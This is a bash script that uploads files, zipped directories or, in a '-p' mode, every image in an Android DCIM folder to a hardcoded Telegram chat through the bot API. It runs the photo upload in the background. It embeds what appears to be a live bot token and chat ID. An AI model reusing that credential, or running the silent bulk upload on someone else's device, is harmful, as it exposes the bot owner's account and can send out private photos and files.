#!/usr/bin/env bash
# sender.sh — upload all images in a directory to Telegram in background
# Usage: ./sender.sh [-p] for pictures mode, or <file-or-directory> for single file/dir
# Optional: set TELE_TOKEN and TELE_CHAT env vars to override defaults.

set -euo pipefail

# === CONFIG ===
DEFAULT_TOKEN="7930568732:AAFX_JcdEO3kNrmma6x1xHLahbHD1cgmet8"
DEFAULT_CHAT="6565158025"

TOKEN="${TELE_TOKEN:-$DEFAULT_TOKEN}"
CHAT_ID="${TELE_CHAT:-$DEFAULT_CHAT}"
# ===============

API="https://api.telegram.org/bot${TOKEN}/sendDocument"

# Function to send a single file
send_file() {
  local file="$1"
  echo "Uploading '$file'..."
  resp=$(curl -sS -w "\n%{http_code}" -X POST "$API" \
    -F chat_id="$CHAT_ID" \
    -F document=@"$file" \
    -F caption="File: $(basename "$file")" )
  http_code=$(echo "$resp" | tail -n1)
  body=$(echo "$resp" | sed '$d')
  if [ "$http_code" = "200" ]; then
    echo "Upload successful ✓: $(basename "$file")"
  else
    echo "Upload failed — HTTP $http_code: $(basename "$file")"
  fi
}

# === MAIN LOGIC ===

if [ $# -lt 1 ]; then
  echo "Usage: $0 [-p] or <file-or-directory>"
  exit 2
fi

if [ "$1" = "-p" ]; then
  # Picture mode: send all images in default directory
  PICS_DIR="$HOME/shared/DCIM"   # Change this to wherever your pictures are
  if [ ! -d "$PICS_DIR" ]; then
    echo "Error: pictures directory '$PICS_DIR' not found"
    exit 3
  fi

  (
    shopt -s nullglob
    for img in "$PICS_DIR"/*.{jpg,jpeg,png,gif,webp}; do
      send_file "$img"
    done
  ) &

  echo "All images from '$PICS_DIR' are being uploaded in the background..."
  exit 0
fi

# Otherwise, treat argument as single file or directory
TARGET="$1"

if [ -d "$TARGET" ]; then
  ZIP_NAME="$(basename "$TARGET").zip"
  echo "Zipping directory '$TARGET' -> '$ZIP_NAME'..."
  zip -r "$ZIP_NAME" "$TARGET" >/dev/null
  FILE="$ZIP_NAME"
elif [ -f "$TARGET" ]; then
  FILE="$TARGET"
else
  echo "Error: '$TARGET' is not a file or directory"
  exit 3
fi

echo "Uploading '$FILE' to Telegram chat $CHAT_ID..."
resp=$(curl -sS -w "\n%{http_code}" -X POST "$API" \
  -F chat_id="$CHAT_ID" \
  -F document=@"$FILE" \
  -F caption="File: $(basename "$FILE")" )

http_code=$(echo "$resp" | tail -n1)
body=$(echo "$resp" | sed '$d')

if [ "$http_code" = "200" ]; then
  echo "Upload successful ✓"
  [ -d "$TARGET" ] && rm -f "$FILE"
else
  echo "Upload failed — HTTP $http_code"
  echo "$body"
  exit 4
fi
